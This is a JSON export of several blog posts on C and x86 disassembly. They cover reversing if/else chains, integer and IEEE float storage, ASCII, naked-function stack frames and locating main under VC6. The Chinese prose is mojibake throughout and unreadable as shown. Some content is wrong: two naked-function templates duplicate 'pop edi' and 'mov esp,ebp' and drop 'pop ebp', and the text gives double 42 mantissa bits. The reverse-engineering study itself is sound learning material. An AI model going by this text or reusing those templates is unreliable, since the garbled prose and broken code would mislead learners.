åŠŸèƒ½åˆ†æ:å°†å‚æ•°Xå­˜åˆ°åˆ°EAXä¸­ï¼Œç„¶åæ¯”è¾ƒEAX,ä¸å‚æ•°Yçš„å¤§å°.å¦‚æœX&lt;=Y é‚£ä¹ˆè·³è½¬åˆ°00401059çš„ä½ç½®,å¦åˆ™ï¼Œå°†Xçš„å€¼å­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­ è¿”å›å€¼åˆ†æ æ—  ç»ƒä¹ ï¼š åˆ†æå‚æ•°ï¼š[ebp+8] : X [ebp+0Ch] :Y åˆ†æå±€éƒ¨å˜é‡ [ebp-4]ï¼ša åˆ†æå…¨å±€å˜é‡ mov eax,[004225c4]: m åŠŸèƒ½åˆ†æ:(çœç•¥ï¼Œç›´æ¥ä»¥cè¯­è¨€ä»£ç è¡¨ç¤º) è¿”å›å€¼åˆ†æ æ—  é€†ä¸ºcå‡½æ•°ï¼š int m=1; void Funcation(int x, int y) { int a; a=m; if(x&lt;=y) { y=y+a; m=y; } } IFâ€¦ELSEâ€¦è¯­å¥é€†å‘åˆ†æif..eesè¯­å¥æ¯”ifè¯­å¥å¤šå‡ºäº†-ä¸€ä¸ªâ€œelseâ€ ï¼Œå½“ifè¡¨è¾¾å¼ç»“æœä¸ºçœŸæ—¶è·³è¿‡elseåˆ†æ”¯è¯­å¥å—ï¼Œå½“è¡¨è¾¾å¼ç»“æœä¸ºå‡æ—¶è·³è½¬åˆ°else åˆ†æ”¯è¯­å¥å—ä¸­ã€‚ç‰¹å¾è¯†åˆ«:é¦–å…ˆä¼šæœ‰ä¸€ä¸ªjxxæŒ‡ä»¤ç”¨äºå‘ä¸‹è·³è½¬ï¼Œä¸”è·³è½¬çš„ç›®çš„elseä¸­æœ‰çš„ä¸Šæ–¹æœ‰jmpæŒ‡ä»¤ã€‚else ä»£ç çš„ç»“å°¾æ²¡æœ‰jmpæŒ‡ä»¤ï¼Œelse çš„ä»£ç ä¹Ÿä¼šæ‰§è¡Œif _else. _end çš„ä»£ç ã€‚æ ¹æ®ä»¥ä¸Šç‰¹å¾ï¼ŒæŠŠjxxæŒ‡ä»¤å–ååï¼Œå³å¯è¿˜åŸifâ€¦eseè¯­å¥çš„ä»£ç æ€»ç»“ï¼šè·³è½¬æ‰§è¡Œä¸€éƒ¨åˆ†ä»£ç ï¼Œä¸è·³è½¬æ‰§è¡Œå¦å¤–ä¸€éƒ¨åˆ†ä»£ç æ±‡ç¼–ä»£ç ï¼šåŒæ ·å®‰è£…ä¸€å®šçš„é¡ºåºï¼š 1ï¼šåˆ†æå‚æ•°ï¼š[ebp+8] : X [ebp+0Ch] :Y2ï¼šåˆ†æå±€éƒ¨å˜é‡ [ebp-4] = eax = [004225c4]3ï¼šåˆ†æå…¨å±€å˜é‡ [004225c4] G4ï¼šåŠŸèƒ½åˆ†æ:æ¯”è¾ƒXä¸Yçš„å¤§å°ï¼Œå¦‚æœX&lt;=Yé‚£ä¹ˆæ‰§è¡Œå¦‚æœX&gt;Y é‚£ä¹ˆæ‰§è¡Œ5ï¼šè¿”å›å€¼åˆ†æ æ— ç»ƒä¹ ï¼š åˆ†æå‚æ•°ï¼š[ebp+8] : X [ebp+0Ch] :Y åˆ†æå±€éƒ¨å˜é‡ [ebp-4]ï¼šeax:[004225c4]:a [ebp-8]:b:2 åˆ†æå…¨å±€å˜é‡ mov eax,[004225c4] åŠŸèƒ½åˆ†æ:(çœç•¥ï¼Œç›´æ¥ä»¥cè¯­è¨€ä»£ç è¡¨ç¤º) è¿”å›å€¼åˆ†æ æ—  è¿˜åŸæˆcå‡½æ•°ï¼š int m=1; void Funcation(int x,int y) { int a,b; a=m; b=2; if (x&gt;=y) { b=b+1; if (x&lt;y) { m=b; }else m=a+b; } } IFâ€¦ELSE IFâ€¦ELSEé€†å‘åˆ†æç‰¹å¾è¯†åˆ«:é¦–å…ˆä¼šæœ‰ä¸€ä¸ªjxxæŒ‡ä»¤ç”¨äºå‘ä¸‹è·³è½¬ï¼Œä¸”è·³è½¬çš„ç›®çš„else ifä¸­æœ‰jmpæŒ‡ä»¤ã€‚else ifçš„è·³è½¬ç›®çš„elseä¸­æœ‰jmpæŒ‡ä»¤ï¼Œä¸”elseç çš„ç»“å°¾æ²¡æœ‰jmpæŒ‡ä»¤ï¼Œæ‰€æœ‰jmpçš„ç›®æ ‡åœ°å€ä¸€è‡´ã€‚æ ¹æ®ä»¥ä¸Šç‰¹å¾ï¼ŒæŠŠjxxæŒ‡ä»¤å–åï¼Œå³å¯è¿˜åŸifâ€¦else ifâ€¦.elseè¯­å¥çš„ä»£ç ã€‚å¦‚æœæŸä¸ªåˆ†æ”¯æ²¡æœ‰æ¡ä»¶åˆ¤æ–­ï¼Œåˆ™ä¸ºelseéƒ¨åˆ†ã€‚æ±‡ç¼–ä»£ç ï¼š å‡½æ•°å†…éƒ¨åŠŸèƒ½åˆ†æï¼š 1ã€åˆ†æå‚æ•°ï¼š[ebp+8] X [ebp+0Ch] Y [ebp+10h] Z 2ã€åˆ†æå±€éƒ¨å˜é‡ [ebp-4] = A = 0 [ebp-8] = B = 1 [ebp-0Ch] = C = 2 3ã€åˆ†æå…¨å±€å˜é‡ æ—  4ã€åŠŸèƒ½åˆ†æ if(x&gt;y) { A = B+1; } else if(x&gt;z) { A = C+1; } else if(x&gt;z) { A = B+C } else { A = B+C+1; } return A; ç»ƒä¹ ï¼š1ã€åˆ†æå‚æ•°ï¼š[ebp+8] X [ebp+0Ch] Y [ebp+10h] Z 2ã€åˆ†æå±€éƒ¨å˜é‡ [ebp-4] = A [ebp-8] = B [ebp-0Ch] = C 3ã€åˆ†æå…¨å±€å˜é‡ æ—  4.è¿”å›å€¼åˆ†æ a+1 è¿˜åŸæˆCå‡½æ•°ï¼š int Funcation(int x,int y,int z) { int a=0; int b=1; int c=2; if (x&lt;=y) { a=b-1; } else if (y&gt;=z) { a=c+1; } else if (x&gt;z) { a=b+c; } else a=b+c-1; return a+1; } æ„Ÿæ‚Ÿæ¯ä¸ªåˆ†æ”¯ç±»å‹éƒ½æœ‰è‡ªå·±çš„ç‰¹å¾ç‚¹ï¼Œè®°æ¸…æ¥šè¿™ä¸ªåï¼Œåˆ†æèµ·æ¥ä¼šå®¹æ˜“å¾ˆå¤šã€‚","categories":[],"tags":[{"name":"cä¸æ±‡ç¼–","slug":"cä¸æ±‡ç¼–","permalink":"http://chumen77.xyz/tags/cä¸æ±‡ç¼–/"}]},{"title":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰","slug":"Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰","date":"2019-10-20T15:45:40.000Z","updated":"2020-02-28T07:53:44.000Z","comments":true,"path":"2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/","link":"","permalink":"http://chumen77.xyz/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/","excerpt":"","text":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸‰ï¼‰å‰è¨€æœ¬æ¬¡ä¸»è¦å­¦ä¹ ä¸€ä¸‹Cè¯­è¨€çš„æ•°æ®ç±»å‹ä¸æ•°æ®å­˜å‚¨ã€‚ æ•°æ®ç±»å‹ å­¦ä¹ æ•°æ®ç±»å‹çš„ä¸‰ä¸ªè¦ç´ 1ã€å­˜å‚¨æ•°æ®çš„å®½åº¦2ã€å­˜å‚¨æ•°æ®çš„æ ¼å¼3ã€ä½œç”¨èŒƒå›´(ä½œç”¨åŸŸ)è¿™äº›éƒ½æ˜¯è°ˆèµ·ä¸€ä¸ªæ•°æ®ç±»å‹çš„åŸºæœ¬è¦ç´ ã€‚ æ•´æ•°ç±»å‹ï¼šchar short int long char 8BIT 1å­—èŠ‚ short 16BIT 2å­—èŠ‚ int 32BIT 4å­—èŠ‚ long 32BIT 4å­—èŠ‚ char i = 0xFF; short x =0xFF; long y =0xFF;æˆ‘ä»¬æ¥çœ‹ä¸‹åœ¨æ±‡ç¼–å…¶æ˜¯ä»€ä¹ˆæ ·çš„ï¼šæ³¨æ„byte word dwordçš„åŒºåˆ«ã€‚ç„¶åæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ä»¥ä¸‹ä»£ç ï¼š char i = 0x12345678; short x = 0x12345678; long y = 0x12345678;ç„¶åçœ‹åˆ°è¿˜æ˜¯byte word dwordï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯æˆ‘ä»¬è¿è¡Œä»¥åå¯ä»¥çœ‹åˆ°è¿™å°±è¯´æ˜ä½ å†™äº†32ä½çš„æ•°ç»™char iè¿™ä¸ª8ä½çš„å®¹å™¨ï¼Œè¿™æ˜¯å…è®¸çš„ï¼Œä½†æ˜¯åªèƒ½è£…ä¸‹8ä½ï¼Œå°±ä»ä½ä½å¼€å§‹æŠŠ78æ”¾å…¥ã€‚ æ•´æ•°ç±»å‹åˆ†ä¸ºæœ‰ç¬¦å·(signed)å’Œæ— ç¬¦å·(unsigned)ä¸¤ç§ï¼š char i = 0xFF; unsigned char i = 0xFF;è¦çŸ¥é“å…¶åœ¨å†…å­˜é‡Œå­˜ç€æ˜¾ç¤ºçš„éƒ½æ˜¯FFä½†æ˜¯è¾“å‡ºæ‰“å°å‡ºæ¥ä¸€ä¸ªæ˜¯255 ä¸€ä¸ªæ˜¯-1ï¼Œè¿™å°±æ˜¯è¯´æ˜åœ¨å†…å­˜ä¸­å­˜å‚¨çš„æ–¹å¼å®Œå…¨ä¸€æ ·ï¼Œä½†ä¼šæ ¹æ®ä½ çš„å®šä¹‰æ¥ç¡®å®å…¶æ˜¯æœ‰ç¬¦å·è¿˜æ˜¯æ— ç¬¦å·ã€‚å…¶é»˜è®¤æ˜¯æœ‰ç¬¦å·çš„ï¼Œå½“ä½ æƒ³ç”¨æ— ç¬¦å·çš„æ—¶å€™éœ€è¦ä½ æ¥å®šä¹‰ã€‚å¹¶ä¸”è¿™ä¸ªåªæœ‰åœ¨ç±»å‹è½¬æ¢å’Œå¤§å°æ¯”è¾ƒä¸­ç‰¹åˆ«æ³¨æ„ã€‚å› ä¸ºä½ ç›´æ¥å®šä¹‰ä¸ªæ— ç¬¦å·æ•°ï¼Œå…¶åœ¨å†…å­˜æ”¾çš„æ˜¯å’ŒåŸæ¥æœ‰ç¬¦å·æ•°ä¸€æ ·çš„ï¼Œåªæ˜¯ä½ åœ¨æ¯”è¾ƒæ—¶ç¼–è¯‘å™¨åœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œä¼šæŠŠå…¶ä¼šæŠŠæ±‡ç¼–ä»£ç è·³è½¬é‚£é‡Œæ”¹æˆç‰¹å®šå¯¹åº”çš„JCCä»£ç ï¼ˆåªè¦é’ˆå¯¹æ— ç¬¦å·ï¼Œå› ä¸ºé»˜è®¤æ˜¯æœ‰ç¬¦å·çš„ï¼‰ã€‚ä¾‹å­ï¼šæ— ç¬¦å·æ•°æ¯”è¾ƒï¼Œjccæ˜¯JBEï¼ŒåŸæ¥æ²¡æœ‰æŒ‡å®šæ˜¯æ— ç¬¦å·æ—¶ï¼Œå…¶æ˜¯JLEï¼ˆæœ‰ç¬¦å·ï¼‰æ€»ç»“ï¼š1ï¼šåœ¨å†…å­˜ä¸­å­˜å‚¨çš„æ–¹å¼å®Œå…¨ä¸€æ · ã€‚ 2ï¼šåœ¨ç±»å‹è½¬æ¢å’Œå¤§å°æ¯”è¾ƒä¸­ç‰¹åˆ«æ³¨æ„ï¼ˆè¿ç®—ï¼‰ã€‚ æµ®ç‚¹ç±»å‹ï¼šfloat doublefloatå’Œdoubleåœ¨å­˜å‚¨æ–¹å¼ä¸Šéƒ½æ˜¯éµä»IEEEçš„è§„èŒƒçš„floatçš„å­˜å‚¨æ–¹å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šdoubleçš„å­˜å‚¨æ–¹å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å°†ä¸€ä¸ªfloatå‹è½¬åŒ–ä¸ºå†…å­˜å­˜å‚¨æ ¼å¼çš„æ­¥éª¤ä¸º: å…ˆå°†è¿™ä¸ªå®æ•°çš„ç»å¯¹å€¼åŒ–ä¸ºäºŒè¿›åˆ¶æ ¼å¼ å°†è¿™ä¸ªäºŒè¿›åˆ¶æ ¼å¼å®æ•°çš„å°æ•°ç‚¹å·¦ç§»æˆ–å³ç§»nä½ï¼Œç›´åˆ°å°æ•°ç‚¹ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ªæœ‰ æ•ˆæ•°å­—çš„å³è¾¹ã€‚ ä»å°æ•°ç‚¹å³è¾¹ç¬¬ä¸€ä¸€ä½å¼€å§‹æ•°å‡ºäºŒåä¸‰ä½æ•°å­—æ”¾å…¥ç¬¬22åˆ°ç¬¬0ä½ã€‚ å¦‚æœå®æ•°æ˜¯æ­£çš„ï¼Œåˆ™åœ¨ç¬¬31ä½æ”¾å…¥â€œ0â€ï¼Œå¦åˆ™æ”¾å…¥â€œ1â€ã€‚ å¦‚æœnæ˜¯å·¦ç§»å¾—åˆ°çš„ï¼Œè¯´æ˜æŒ‡æ•°æ˜¯æ­£çš„ï¼Œç¬¬30ä½æ”¾å…¥â€œ1â€ã€‚å¦‚æœnæ˜¯å³ç§»å¾—åˆ°çš„æˆ–n=0ï¼Œåˆ™ç¬¬30ä½æ”¾å…¥â€œ0â€ã€‚ å¦‚æœnæ˜¯å·¦ç§»å¾—åˆ°çš„ï¼Œåˆ™å°†nå‡å»1ååŒ–ä¸ºäºŒè¿›åˆ¶ï¼Œå¹¶åœ¨å·¦è¾¹åŠ â€œ0â€è¡¥è¶³ä¸ƒä½ï¼Œæ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ã€‚ å¦‚æœnæ˜¯å³ç§»å¾—åˆ°çš„æˆ–n=0ï¼Œåˆ™å°†nåŒ–ä¸ºäºŒè¿›åˆ¶ååœ¨å·¦è¾¹åŠ â€œ0â€™è¡¥è¶³ä¸ƒä½ï¼Œå†å„ä½æ±‚åï¼Œå†æ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ã€‚ è¿™æ˜¯å®˜æ–¹è§£é‡Šã€‚æœ‰ç‚¹éº»çƒ¦ã€‚å…ˆç»ƒä¹ ä¸€ä¸ªï¼š8.25è½¬æˆæµ®ç‚¹å­˜å‚¨æ‰€ä»¥8.25ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºå¯è¡¨ç¤ºä¸º1000.01ï¼Œç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºä¸€ä¸‹ï¼š1.00001X2^3å°æ•°ç‚¹å‘å·¦ç§»åŠ¨3ä½ æŒ‡æ•°ä¸º3ï¼Œç„¶åæŒ‰ç…§ä¸Šé¢å…ˆæ”¾ç¬¬ä¸€ä¸ªç©ºæ ¼0ï¼ˆå› ä¸ºæ˜¯æ­£æ•°ï¼‰ï¼Œæ¥ç€æ”¾æœ€åä¸€ä¸ªå¤§æ ¼å­00001ï¼ˆç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºåä»å°æ•°ç‚¹åï¼‰ï¼Œç„¶åä¸­é—´æ ¼å­ç¬¬ä¸€ä½1ï¼ˆå› ä¸ºæ˜¯å·¦ç§»å°æ•°ç‚¹ï¼‰ï¼ŒæŒ‡æ•°3-1=2å˜æˆäºŒè¿›åˆ¶10ä»å³è¾¹å¼€å§‹æ”¾å…¥ã€‚è¿™å°±æ˜¯IEEEè§„èŒƒã€‚(å¯ä»¥æ„Ÿå—åˆ°æœ€éº»çƒ¦å°±æ˜¯ä¸­é—´è¿™æ®µçš„ç¡®å®šå€¼)æŒ‰å››ä½åˆ†å‰²0100 0001 0000 0100 0000 0000 0000 0000=41040000ï¼Œç„¶åå°±è¿™æ ·çš„å½¢å¼å­˜å…¥è®¡ç®—æœºå†…å­˜ã€‚ æˆ‘ä¸‹é¢ç”¨ç®€å•çš„ä¸”æ˜¯æ­£ç¡®çš„åŠæ³•æ¥è½¬æ¢ï¼šå°†floatç±»å‹çš„12.5 è½¬æ¢æˆ16è¿›åˆ¶ï¼šå…ˆæ•´ç†æ­£æ•°éƒ¨åˆ†ï¼Œ12=C=1100å°æ•°éƒ¨åˆ† 0.5 * 2=1.0æ‰€ä»¥äºŒè¿›åˆ¶å°±æ˜¯1100.1ï¼Œç§‘å­¦è®¡æ•°æ³• 1.1001x2^3è¿™æ¬¡å¯¹ä¸­é—´æ ¼å­æ˜¯ç›´æ¥ç”¨127+xçš„ç»“æœ å˜æˆäºŒè¿›åˆ¶å¡«å……è¿™ä¸ªæ ¼å­ï¼Œxçš„å€¼å°±æ˜¯æŒ‡æ•°ï¼Œå…¶ä¸­å·¦ç§»æ˜¯æ­£å³ç§»ä¸ºè´Ÿ doubleç±»å‹å‰é¢è®²è§£äº†å•ç²¾åº¦æµ®ç‚¹ç±»å‹çš„IEEEç¼–ç ã€‚doubleç±»å‹å’Œfloatç±»å‹å¤§åŒå°å¼‚ï¼Œåªæ˜¯doubleç±»å‹è¡¨ç¤ºçš„èŒƒå›´æ›´å¤§ï¼Œå ç”¨ç©ºé—´æ›´å¤šï¼Œæ˜¯floatç±»å‹æ‰€å ç”¨ç©ºé—´çš„ä¸¤å€ã€‚å½“ç„¶ï¼Œç²¾å‡†åº¦ä¹Ÿä¼šæ›´é«˜ã€‚ doubleç±»å‹å 8å­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼ŒåŒæ ·ï¼Œæœ€é«˜ä½ä¹Ÿç”¨äºè¡¨ç¤ºç¬¦å·ï¼ŒæŒ‡æ•°ä½å 11ä½ï¼Œå‰©ä½™42ä½ç”¨äºè¡¨ç¤ºä½æ•°ã€‚åœ¨floatä¸­ï¼ŒæŒ‡æ•°ä½èŒƒå›´ç”¨8ä½è¡¨ç¤ºï¼ŒåŠ 127åç”¨äºåˆ¤æ–­æŒ‡æ•°ç¬¦å·ã€‚åœ¨doubleä¸­ï¼Œç”±äºæ‰©å¤§äº†ç²¾åº¦ï¼Œå› æ­¤æŒ‡æ•°èŒƒå›´ä½¿ç”¨11ä½æ­£æ•°è¡¨ç¤ºï¼ŒåŠ 1023åå¯ç”¨äºæŒ‡æ•°ç¬¦å·åˆ¤æ–­ã€‚ doubleç±»å‹çš„IEEEç¼–ç è½¬æ¢è¿‡ç¨‹ä¸float ç±»å‹ä¸€æ ·ï¼Œå¯æ ¹æ®floatç±»å‹çš„è½¬æ¢æµç¨‹æ¥è½¬æ¢doubleç±»å‹ã€‚ è‹±æ–‡å­—ç¬¦å­˜å‚¨char x = â€˜Aâ€™;å¯¹äºä¸€ä¸ªè‹±æ–‡å­—ç¬¦ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æŸ¥ASCIIè¡¨è·å–å…¶å®šä¹‰çš„7ä½äºŒè¿›åˆ¶æ•°ï¼Œç„¶åè½¬æ¢å­˜å‚¨å…¶16è¿›åˆ¶æ”¾å…¥å†…å­˜ä¸­ã€‚ä¾‹ï¼šè¡¥å……ï¼š æ ‡å‡† ASCII ç ä½¿ç”¨ 7 ä½äºŒè¿›åˆ¶æ•°æ¥è¡¨ç¤ºæ‰€æœ‰çš„å¤§å†™å’Œå°å†™å­—æ¯ï¼Œæ•°å­— 0 åˆ° 9ã€æ ‡ç‚¹ç¬¦å·ï¼Œä»¥åŠåœ¨ç¾å¼è‹±è¯­ä¸­ä½¿ç”¨çš„ç‰¹æ®Šæ§åˆ¶å­—ç¬¦ã€‚ ASCII ç ä½¿ç”¨æŒ‡å®šçš„ 7 ä½æˆ– 8 ä½äºŒè¿›åˆ¶æ•°ç»„åˆæ¥è¡¨ç¤º 128 æˆ– 256 ç§å¯èƒ½çš„å­—ç¬¦ã€‚ æ‰©å±• ASCII ç å…è®¸å°†æ¯ä¸ªå­—ç¬¦çš„ç¬¬ 8 ä½ç”¨äºç¡®å®šé™„åŠ çš„ 128 ä¸ªç‰¹æ®Šç¬¦å·å­—ç¬¦ã€å¤–æ¥è¯­å­—æ¯å’Œå›¾å½¢ç¬¦å·ã€‚ ä¸ºä»€ä¹ˆä¸æ˜¯å…«ä½äºŒè¿›åˆ¶å‘¢ï¼Ÿå› ä¸ºå…¶ç¬¬ä¸€ä½éƒ½æ˜¯0ï¼Œæ²¡å¿…è¦è®°å½•ï¼Œåœ¨èµ·åˆ7ä½å·²ç»æ»¡è¶³éœ€æ±‚ã€‚","categories":[],"tags":[{"name":"cä¸æ±‡ç¼–","slug":"cä¸æ±‡ç¼–","permalink":"http://chumen77.xyz/tags/cä¸æ±‡ç¼–/"}]},{"title":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰","slug":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰","date":"2019-10-19T15:49:13.000Z","updated":"2020-02-28T07:53:46.000Z","comments":true,"path":"2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/","link":"","permalink":"http://chumen77.xyz/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/","excerpt":"","text":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰å‰è¨€æœ¬æ¬¡ä¸»è¦å­¦ä¹ ä¸€ä¸‹cæ˜¯å¦‚ä½•å˜æˆæ±‡ç¼–çš„ï¼ŒæŸ¥æ‰¾ç¨‹åºå…¥å£ï¼Œè°ƒç”¨çº¦å®šï¼Œå’Œä¸»è¦ç»ƒä¹ ä½¿ç”¨__declspec(naked)è£¸å‡½æ•°å®ç°éƒ¨åˆ†ç®€å•çš„åŠŸèƒ½å’Œå®Œæ•´çš„é€†ä¸€ä¸ªç®€å•EXEæˆcè¯­è¨€ã€‚ è£¸å‡½æ•°ä»€ä¹ˆæ˜¯è£¸å‡½æ•°ï¼Ÿvoid __declspec(naked) Function() {.....}åœ¨ä»£ç ä¸­ç”³æ˜å‡½æ•°åï¼Œç¼–è¯‘æ—¶ï¼Œé™¤äº†å…¥å£å‚æ•°å‹æ ˆå¤–ï¼Œç„¶åå°±æ˜¯callè¿™ä¸ªå‡½æ•°ï¼Œç¼–è¯‘å™¨ä¸ä¼šä¸ºå‡½æ•°ä½“ç”Ÿæˆä»»ä½•ä»£ç ã€‚ è¿è¡Œè£¸å‡½æ•°ä¸ºä»€ä¹ˆä¼šå‡ºé”™ä»¥ä¸Šçš„è£¸å‡½æ•°è¿è¡Œåï¼Œå› ä¸ºç¼–è¯‘å™¨é™¤äº†å…¥å£å‚æ•°å‹æ ˆå¤–ï¼Œç„¶åå°±æ˜¯callè¿™ä¸ªå‡½æ•°ï¼Œä¸ä¼šç»™å…¶ç”Ÿæˆä»»ä½•çš„æ±‡ç¼–ä»£ç ï¼Œæ‰€ä»¥æ˜æ˜¾è¿è¡Œåå…¶æ— æ³•å›åˆ°åŸæ¥çš„ä¸»å‡½æ•°ï¼Œç„¶åå †æ ˆæ˜¯ä¸å¹³è¡¡çš„ã€‚æ‰€ä»¥ï¼š void __declspec(naked) Function() { __asm ret }åŠ ä¸€ä¸ªretå°±å¥½äº†ï¼Œä¸ä¼šå†æŠ¥é”™äº†ã€‚ è£¸å‡½æ•°æ¡†æ¶ç®€å•é›†åˆæ— å‚æ•°æ— è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶void __declspec(naked) Function() { __asm { push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret } }æœ‰å‚æ•°æœ‰è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶void __declspec(naked) Function() { __asm { push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd //ä¸»è¦åŠŸèƒ½ mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret } }å¸¦å±€éƒ¨å˜é‡çš„å‡½æ•°æ¡†æ¶void __declspec(naked) Function() { __asm { push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd //ä¸»è¦åŠŸèƒ½ mov dword ptr ds:[ebp-4],2 mov dword ptr ds:[ebp-8],3 mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] //æ³¨æ„æ±‡ç¼–ä¸­å±€éƒ¨å˜é‡çš„å­˜æ”¾åŠæ³• pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret } }åœ¨ç»ƒä¹ ä¸­å‘ç°å¯¹å±€éƒ¨å˜é‡åœ¨æ±‡ç¼–ä¸­å¦‚ä½•å­˜æ”¾ï¼Œå¦‚ä½•ä½“ç°æœ‰äº›ç”Ÿç–ï¼Œç‰¹æ­¤è®°å½•ä¸€ä¸‹ã€‚ é’ˆå¯¹è£¸å‡½æ•°çš„ç»ƒä¹ ç›®æ ‡æ˜¯è¦å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š int plus(int x,int y,int z) { int a = 2; int b = 3; int c = 4; return x+y+z+a+b+c; }ä»£ç ï¼š // Day2.cpp : Defines the entry point for the console application. // #include &quot;stdafx.h&quot; int __declspec(naked) plus(int x,int y,int z) { __asm { push ebp mov ebp,esp sub esp,0x40 //å¼€æ ˆ push ebx push esi push edi //ä¿æŠ¤ç°åœº lea edi,dword ptr ds:[ebp-0x40] mov ecx,0x10 mov eax,0xCCCCCCCC rep stosd //ä¸ºç¼“å†²åŒºå¡«å……æ•°æ® //çœŸæ­£è¦æ‰§è¡Œçš„åŠŸèƒ½ //å±€éƒ¨å˜é‡ï¼šEBPâ€”4å¼€å§‹ å‚æ•°ï¼šebp+8å¼€å§‹ //ebp+4æ˜¯eip åŸæ¥callä¸‹æ¡è¯­å¥ mov eax,0x2 mov dword ptr ds:[ebp-0x4],eax mov eax,0x3 mov dword ptr ds:[ebp-0x8],eax mov eax,0x4 mov dword ptr ds:[ebp-0x0C],eax //æ”¾å…¥å±€éƒ¨å˜é‡ mov eax,dword ptr ds:[ebp+0x8] add eax,dword ptr ds:[ebp+0x0C] add eax,dword ptr ds:[ebp+0x10] add eax,dword ptr ds:[ebp-0x4] add eax,dword ptr ds:[ebp-0x8] add eax,dword ptr ds:[ebp-0x0C] mov dword ptr ds:[ebp-0x4],eax //æŠŠè®¡ç®—ç»“æœæ”¾å…¥æ ˆä¸­ï¼Œä¸‹é¢ä¸»å‡½æ•°æ‰“å°aæ—¶è¦ç”¨åˆ° pop edi; pop esi; pop ebx; mov esp,ebp pop ebp ret } } int main(int argc, char* argv[]) { int a; a=plus(6,7,8); printf(&quot;%d\\n&quot;,a); return 0; }ç»ƒä¹ è¿™ä¸ªå¯ä»¥æ›´åŠ ç†Ÿæ‚‰å †æ ˆç»“æ„ï¼Œå‚æ•°ã€å±€éƒ¨å˜é‡çš„ä½ç½®ã€‚ ç¨‹åºçœŸæ­£çš„å…¥å£main æˆ–WinMain æ˜¯â€œè¯­æ³•è§„å®šçš„ç”¨æˆ·å…¥å£â€ï¼Œè€Œä¸æ˜¯â€œåº”ç”¨ç¨‹åºå…¥å£â€ã€‚åº”ç”¨ç¨‹åºå…¥å£é€šå¸¸æ˜¯å¯åŠ¨å‡½æ•°ã€‚ åœ¨ODä¸­é»˜è®¤è®¾ç½®å°±æ˜¯åˆ°winmainå…¥å£å°±æš‚åœç¨‹åºï¼Œå…¶å¹¶ä¸æ˜¯ä¸»å‡½æ•°å…¥å£ã€‚å…¶å®æ¯ä¸€ç§ç¼–è¯‘å™¨éƒ½æœ‰è‡ªå·±ä¸€å¥—çš„ç¼–è¯‘æ ‡å‡†ï¼Œåœ¨ä¸»å‡½æ•°å¯åŠ¨å‰è¦åšä¸€äº›å¿…è¦çš„å‡†å¤‡å·¥ä½œï¼Œä¸‹é¢æˆ‘åˆ†æçš„æ˜¯vc6.0çš„ã€‚ main å‡½æ•°çš„è¯†åˆ«ä¸å¯»æ‰¾åªæ˜¯vc++6.0main å‡½æ•°è¢«è°ƒç”¨å‰è¦å…ˆè°ƒç”¨çš„å‡½æ•°å¦‚ä¸‹ï¼š GetVersion() _heap_init() GetCommandLineA() _crtGetEnvironmentStringsA() _setargv() _setenvp() _cinit() è¿™äº›å‡½æ•°è°ƒç”¨ç»“æŸåå°±ä¼šè°ƒç”¨main å‡½æ•°ï¼Œæ ¹æ®main å‡½æ•°è°ƒç”¨çš„ç‰¹å¾ï¼Œå°†3ä¸ªå‚æ•°å‹å…¥æ ˆå†…ä½œä¸ºå‡½æ•°çš„å‚æ•°ã€‚æ‰€ä»¥åœ¨winmainåœä¸‹åï¼Œå¯ä»¥ä¸€ç›´å•æ­¥è°ƒè¯•ï¼Œé‡åˆ°callçš„æ—¶å€™ï¼Œæ³¨æ„å‰æ–¹æ˜¯ä¸æ˜¯æœ‰3ä¸ªå‚æ•°è¢«å‹å…¥æ 